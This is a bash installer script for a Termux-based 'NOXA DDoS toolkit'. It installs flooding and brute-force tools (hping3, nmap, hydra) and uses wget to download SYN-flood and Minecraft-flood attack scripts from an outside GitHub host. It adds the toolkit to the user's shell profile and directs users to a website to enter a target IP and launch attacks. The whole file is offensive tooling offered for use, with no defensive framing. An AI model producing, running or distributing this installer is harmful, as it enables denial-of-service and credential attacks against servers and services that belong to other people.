#!/bin/bash
# NOXA Toolkit - Termux Installer
# Website: https://noxa-ddos.netlify.app

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}"
cat << "EOF"
╔═══════════════════════════════════════╗
║        NOXA DDOS TOOLKIT v2.0         ║
║       Ultimate Browser Attack         ║
╚═══════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${GREEN}[+] Checking Termux environment...${NC}"

# Check if running in Termux
if [ ! -d "/data/data/com.termux" ]; then
    echo -e "${RED}[!] This script must be run in Termux${NC}"
    echo -e "${YELLOW}[!] Please install Termux from F-Droid${NC}"
    exit 1
fi

echo -e "${YELLOW}[1] Updating packages...${NC}"
pkg update -y && pkg upgrade -y

echo -e "${YELLOW}[2] Installing dependencies...${NC}"
pkg install -y python python2 git wget curl hping3 nmap hydra busybox openssl-tool

echo -e "${YELLOW}[3] Downloading attack scripts...${NC}"
mkdir -p ~/noxa-attack
cd ~/noxa-attack

# Download attack scripts
wget -q https://raw.githubusercontent.com/noxa-tools/scripts/main/minecraft-flood.py
wget -q https://raw.githubusercontent.com/noxa-tools/scripts/main/syn-attack.sh

echo -e "${YELLOW}[4] Setting up environment...${NC}"
cat > ~/.noxarc << EOF
export NOXA_HOME="\$HOME/noxa-attack"
export PATH="\$PATH:\$NOXA_HOME"
EOF

echo 'source ~/.noxarc' >> ~/.bashrc

echo -e "${GREEN}"
echo "========================================"
echo " INSTALLATION COMPLETE!"
echo "========================================"
echo " To launch browser attack:"
echo " 1. Visit: https://noxa-ddos.netlify.app"
echo " 2. Enter target IP/domain"
echo " 3. Click 'LAUNCH TOTAL ANNIHILATION'"
echo ""
echo " For command-line attacks:"
echo "  cd ~/noxa-attack"
echo "  python minecraft-flood.py"
echo "========================================"
echo -e "${NC}"

# Ask to open website
read -p "Open NOXA website in browser? (y/n): " choice
if [[ $choice == "y" || $choice == "Y" ]]; then
    termux-open-url "https://noxa-ddos.netlify.app"
fi